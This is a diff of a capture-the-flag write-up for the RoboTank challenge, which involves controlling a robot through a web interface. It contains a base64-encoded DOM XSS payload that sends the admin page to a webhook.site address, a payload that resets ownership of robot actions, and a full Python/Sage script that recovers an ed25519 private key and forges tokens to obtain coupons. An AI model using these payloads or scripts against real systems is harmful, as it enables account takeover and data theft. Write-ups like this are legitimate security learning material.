@@ -1,31 +1,40 @@
 # Overview
 ---
 
->This is a cyberwar. <br>
->Every cyberwar has its robotank. <br>
+>This is a cyberwar.
+>Every cyberwar has its robotank.
 >This is our robotank.
 
-The challenge was a web-interface to control a robot located on site. Every team had their own unique credentials. At the first login every team received a coupon worth 5 credits. On the web-interface it was possible to buy an action at price of 5 credits (or a shield at the price of 15). 
+The goal of the RoboTank challenge is to exploit the provided web interface in order to control a robot located on site, and find the flags placed in the room. Upon the initial login, every team was granted a coupon worth 5 credits. Through the web interface, teams could purchase actions for 5 credits each (or shields for 15 credits).
 
-The buttons in the main page could be used to execute real-time actions on the robot.
-A single button could have the following state:
-- **disabled**: the action was owned by another team, so you couldn't buy it.
-- **blue**: no one owned the action, so it could be bought (supposed you had sufficient balance).
-- **green**: you were the owner and you could execute it.
+On the main page, buttons allow to execute real-time actions on the robot. A button could be in one of three states:
+- **Disabled**: the action was owned by another team, so you couldn't buy it;
+- **Blue**: no one owned the action, so it could be bought (supposed you had sufficient balance);
+- **Green**: you were the owner and you could execute it.
 
 ![](webinterface_start.png)
 # Exploitation
 ---
 ## Web
-We notice that in the account main page it is possible to change our team's motto.
-In `bbrender.js` the team's motto is parsed and it is possible to use a custom tags to wr. The problem with this sintax is that is not only possible
+
+Initially, upon accessing the main page, all action buttons are disabled, as the user admin owns all robot actions. The primary objective was to gain ownership of the robot's actions.
+
+Upon examining the source files, we identified an intriguing endpoint, `/report`, where a user could submit a URL to an admin bot. Additionally, by analyzing the source code in `admin.js`, we discovered that an admin user could reset the ownership of a specific robot action. Armed with this knowledge, the central goal was to uncover a method for executing XSS to send to the bot and reset the robot's actions.
+
+On the account page `/account/:id`, users could modify a team's motto, and this change would be reflected in another section of the same page.
+
+![](account_page.png)
+
+The `bbrender.js` script was responsible of altering a team's motto. By inspecting the code below, we noticed that the content inside the element in the red box on the left side was extracted through the instruction `window.current_motto.innerText`. Subsequent checks and manipulations were performed, and the result was then inserted back into the same element. However, this process presented **two** main issues: the use of the `innerText` property at the end, which does not sanitize user input (would be better to use a safe property like `textContent` or `DOMPurify` library), and the implemented custom syntax, which allows XSS.
 
 ```js
+// bbrender.js
+
 $(document).ready(() => {
 	if (window.current_motto) {
 		var current_motto = window.current_motto.innerText;
 		
-		//Welcome back to my laboratory, where safety is number one priority
+		//Welcome back to my laboratory, where safety is number one prioritydefault_account
 		if (current_motto.includes("<") || current_motto.includes(">")) 
 			return; 
 		
@@ -45,24 +54,37 @@ $(document).ready(() => {
 });
 ```
 
+The code revealed that the authors disabled the insertion of images due to safety concerns. Nevertheless, exploiting the presence of certain tags, we successfully triggered a **DOM XSS** after some attempts. As our initial action, we dumped the admin page using the following payload:
+```
+[url \"aa\"onfocus=\"eval(atob('ZmV0Y2goJy9hZG1pbicpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4oKGQpPT57ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzcyZTEyMGZhLTQyOTEtNDY1ZC05ZDQ1LWI5Zjg0YzM2YmM5OD9jPScrZW5jb2RlVVJJQ29tcG9uZW50KGQpKX0p'))\"autofocus]XSS[/url]
+```
 
 ```js
+// Decoded version of base64 
+
 fetch('/admin')
-	.then(r=>r.text())
-	.then((d)=>{
+	.then(r => r.text())
+	.then((t) => {
 		fetch(
 			'https://webhook.site/[webhook]',
-			{method:'POST',body:d}
+			{method:'POST', body:t}
 		)
 	})
 ```
 
-```
-[url\"aa\"onfocus=\"eval(atob('ZmV0Y2goJy9hZG1pbicpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4oKGQpPT57ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzcyZTEyMGZhLTQyOTEtNDY1ZC05ZDQ1LWI5Zjg0YzM2YmM5OD9jPScrZW5jb2RlVVJJQ29tcG9uZW50KGQpKX0p'))\"autofocus]ciao[/url]
-```
+![The dumped page](admin_reset_page.png)
 
+After obtaining the XSS, we created payloads to reset all robot's actions: camera, forward, left, right, and backward.
 
+Using the initial coupon of 5 credits that was given at the beginning to each team, we bought the camera action...
 
+![](ichnusa_meme.png)
+#### Payload description
+In the image below, you can see an example of a payload that allows us to reset the ownership of the *forward* action. The first is what we can insert into the account motto input text and the second is how it becomes after the parsing. In order to fool the `includes` function and avoid breakage of our payload we encoded our payload in base64. After obtaining the XSS, we created payloads to reset all robot's actions: camera, forward, left, right, and backward.
+
+Using the initial coupon of 5 credits that was given at the beginning to each team, we bought the camera action...
+![NOTE: There is a space between url and \\](poc.png)
+The base64 inside the `atob` function is the code attached below.
 ```js
 fetch(
 	'/admin',
@@ -73,17 +95,16 @@ fetch(
 	}
 )
 ```
-
-```
-[url\"aa\"onfocus=\"eval(atob('ZmV0Y2goJy9hZG1pbicse21ldGhvZDonUE9TVCcsaGVhZGVyczp7IkNvbnRlbnQtVHlwZSI6ImFwcGxpY2F0aW9uL2pzb24ifSxib2R5OkpTT04uc3RyaW5naWZ5KHtpZDogMX0pfSk='))\"autofocus]ciao[/url]
-```
-
-
-
-
 ## Crypto
 
-### Context
+After obtaining a way to reset the actions' ownership, we need to find a way to increment our credits to buy the robot's actions. The idea was to exploit the reset account functionality in order to receive a new coupon.
+
+Starting from the account page, we noticed that other specific information is provided to the user (if you have a familiarity with cryptography probably already recognize them): Public key, Generator (x), and Challenge for token.
+
+![](crypto_page.png)
+
+By inspecting the code in the `account.js` source, in particular, we focused on the reset account code section, which after validating the provided token resets the user account and **sets a new coupon**. 
+
 ```js
 if (await verifyToken(challenge, private_key, token)) {
 	coupon = uuid();
@@ -91,10 +112,7 @@ if (await verifyToken(challenge, private_key, token)) {
 	...
 ```
 
-The private key is generated using the following code:
-
-TBA
-
+Where `verifyToken` function performs a ECDSA verify using the `ed25519` curve, therefore to pass the `verifyToken` function we need to sign the challenge with the private key.
 ### Recover the private key
 
 Searching for all the occurrences of the private key in the source code one finds, at line 48 of `routes/auth.js` where `/auth/login` is treated, the following:
@@ -177,11 +195,17 @@ p = 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffed
 K = GF(p)
 a = K(0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffec)
 d = K(0x52036cee2b6ffe738cc740797779e89800700a4d4141d8ab75eb4dca135978a3)
-E = EllipticCurve(K, (K(-1) / K(48) * (a**2 + 14*a*d + d**2), K(1) / K(864) * (a + d) * (-a**2 + 34*a*d - d**2)))
+E = EllipticCurve(K, (
+    K(-1) / K(48) * (a**2 + 14*a*d + d**2), 
+    K(1) / K(864) * (a + d) * (-a**2 + 34*a*d - d**2)
+))
 
 
 def to_weierstrass(a, d, x, y):
-    return ((5*a + a*y - 5*d*y - d)/(12 - 12*y), (a + a*y - d*y -d)/(4*x - 4*x*y))
+    return (
+        (5*a + a*y - 5*d*y - d)/(12 - 12*y), 
+        (a + a*y - d*y -d)/(4*x - 4*x*y)
+    )
 
 
 def to_twistededwards(a, d, u, v):
@@ -190,10 +214,18 @@ def to_twistededwards(a, d, u, v):
     return (x, y)
 
 
-G = E(*to_weierstrass(a, d, K(0x216936D3CD6E53FEC0A4E231FDD6DC5C692CC7609525A7B2C9562D608F25D51A), K(0x6666666666666666666666666666666666666666666666666666666666666658)))
-E.set_order(0x1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed * 0x08)
+G = E(*to_weierstrass(
+    a, 
+    d, 
+    K(0x216936D3CD6E53FEC0A4E231FDD6DC5C692CC7609525A7B2C9562D608F25D51A), 
+    K(0x6666666666666666666666666666666666666666666666666666666666666658)
+))
+E.set_order(
+    0x1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed * 0x08
+)
 
-# This curve is a Weierstrass curve (SAGE does not support TwistedEdwards curves) birationally equivalent to the intended curve.
+# This curve is a Weierstrass curve (SAGE does not support TwistedEdwards curves) 
+# birationally equivalent to the intended curve.
 # You can use the to_weierstrass and to_twistededwards functions to convert the points.
 
 
@@ -201,14 +233,18 @@ def get_secrets_to_send() -> "list[str]":
     secret = "0" * 64
     secrets = []
     for i in range(256):
-        secrets.append(hex(int("0" * i + "1" + "0" * (256 - i - 1), 2))[2:].zfill(64))
+        secrets.append(hex(int(
+            "0" * i + "1" + "0" * (256 - i - 1), 2
+        ))[2:].zfill(64))
     return [secret] + secrets
 
 
 def recover_session_key(public_keys: "list[tuple[int, int]]") -> str:
     global G, E, a, d, K
 
-    public_keys = [E(*to_weierstrass(a, d, K(x), K(y))) for x, y in public_keys]
+    public_keys = [
+        E(*to_weierstrass(a, d, K(x), K(y))) for x, y in public_keys
+    ]
     public_key, public_keys = public_keys[0], public_keys[1:]
 
     session_key = ""
@@ -231,29 +267,42 @@ def recover_privkey(original_secret: str, session_key: str) -> str:
 
 def get_pubkey(privkey: str) -> "tuple[int, int]":
     global G, a, d
-    return tuple(map(int, to_twistededwards(a, d, *(int(privkey, 16) * G).xy())))
+    return tuple(map(int, to_twistededwards(
+        a, 
+        d, 
+        *(int(privkey, 16) * G).xy()
+    )))
 ```
 
 The following script is the main exploit:
 
 ```python
-from ed25519_utils import get_secrets_to_send, recover_session_key, recover_privkey, get_pubkey
+from ed25519_utils import (
+	get_secrets_to_send, 
+	recover_session_key, 
+	recover_privkey, 
+	get_pubkey
+)
 from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
 from Crypto.Util.number import long_to_bytes
 import requests, ast, tqdm
 
 url = "https://robotank.snakectf.org/"
+priv_key = None
 
 session = requests.Session()
 
-res = session.post(url + "auth/login", json={
-    'password': '86c3baebe20b03ffb6568fd1f2d1e7d067d3c0925648a089ed11fc79e312463f',
-    'username': 'srdnlen'
-})
+res = session.post(
+	url + "auth/login", 
+	json={
+	    'password': 'REDACTED',
+	    'username': 'srdnlen'
+	}
+)
 
+res = session.get(url + "account/:id")
+team_id = res.url.split("/").pop()
 secret_original = session.cookies["secret"]
-
-priv_key = "c78f3d1bc135ed0cf6c7d33a0e789332c4f5e9af9f6151cab6dd60e1cd85ef"
 
 if priv_key is None:
     secrets = get_secrets_to_send()
@@ -261,16 +310,26 @@ if priv_key is None:
     public_keys = []
     for secret in tqdm.tqdm(secrets):
         session.cookies.set("secret", secret)
-        res = session.get(url + "account/13")
+        res = session.get(url + f"account/{team_id}")
+        
         assert "Public Key: " in res.text
-        public_keys.append(ast.literal_eval(res.text.split("Public Key: ").pop().split("</p>").pop(0)))
+        
+        public_keys.append(
+	        ast.literal_eval(
+		        res.text.split("Public Key: ")
+					    .pop()
+				        .split("</p>")
+				        .pop(0)
+			)
+		)
 
     session_key = recover_session_key(public_keys)
     print("Session key:", session_key)
 
     # Check if session key is correct
     session.cookies.set("secret", session_key)
-    res = session.get(url + "account/13")
+    res = session.get(url + f"account/{team_id}")
+    
     # Internal Server Error because it uses 0 as a private key
     assert res.status_code == 500
 
@@ -278,15 +337,28 @@ if priv_key is None:
 
     # Check if private key is correct
     session.cookies.set("secret", secret_original)
-    res = session.get(url + "account/13")
+    res = session.get(url + f"account/{team_id}")
+    
     assert "Public Key: " in res.text
-    public_key = ast.literal_eval(res.text.split("Public Key: ").pop().split("</p>").pop(0))
+    
+    public_key = ast.literal_eval(
+	    res.text.split("Public Key: ")
+			    .pop()
+			    .split("</p>")
+			    .pop(0)
+	)
     public_key_recovered = get_pubkey(priv_key)
-    assert public_key == public_key_recovered, "Public key mismatch, private key is incorrect"
+    
+    assert (
+	    public_key == public_key_recovered, 
+	    "Public key mismatch, private key is incorrect"
+	)
 
     print("Private key:", priv_key)
 
-sk = Ed25519PrivateKey.from_private_bytes(bytes.fromhex("00" + priv_key))
+sk = Ed25519PrivateKey.from_private_bytes(
+	bytes.fromhex("00" + priv_key)
+)
 
 
 def sign(challenge: int) -> str:
@@ -295,12 +367,59 @@ def sign(challenge: int) -> str:
     return sign.hex()
 
 
-try:
-    while True:
-        challenge = int(input("Challenge: "))
-        print("Signature:", sign(challenge))
-except KeyboardInterrupt:
-    print("Bye!")
-except Exception as e:
-    print(e)
+if __name__ == '__main__':
+	try:
+	    while True:
+	        if input("Reset account?").lower().startswith("n"):
+	            print("Bye!")
+	            break
+	
+	        res = session.get(url + f"account/{team_id}")
+	        assert "Challenge for token: " in res.text
+	        challenge = int(
+		        res.text.split("Challenge for token: ")
+				        .pop()
+				        .split("</p>")
+				        .pop(0)
+			)
+	        
+	        res = session.post(
+		        url + f"account/{team_id}/token", 
+		        json={"token": sign(challenge)}
+		    )
+	        coupon = res.json()["coupon"]
+	
+	        res = session.post(
+		        url + "auth/login", 
+		        json={
+		            'password': 'REDACTED',
+		            'username': 'srdnlen'
+		        }
+		    )
+	
+	        res = session.post(
+		        url + f"account/{team_id}/coupon", 
+		        json={"coupon": coupon}
+		    )
+	except KeyboardInterrupt:
+	    print("\nBye!")
+	except Exception as e:
+	    print(e)
+
 ```
+# Summary
+At the end, we put the two exploit together to control the remote robot.
+
+Final Flow:
+- Reset interested robot's action using XSS
+- Infer the private key using public key and secret (only one time)
+- Retrieve challenge from account page
+- Sign the challenge with the private key
+- Buy the interested action
+- Send the command to the remote robot
+
+We repeated this flow to navigate with the robot in the room and find the two pieces of hidden flags.
+#### First part of the flag:
+![](flag_first_part.png)
+#### Second part of the flag:
+![](flag_second_part.png)
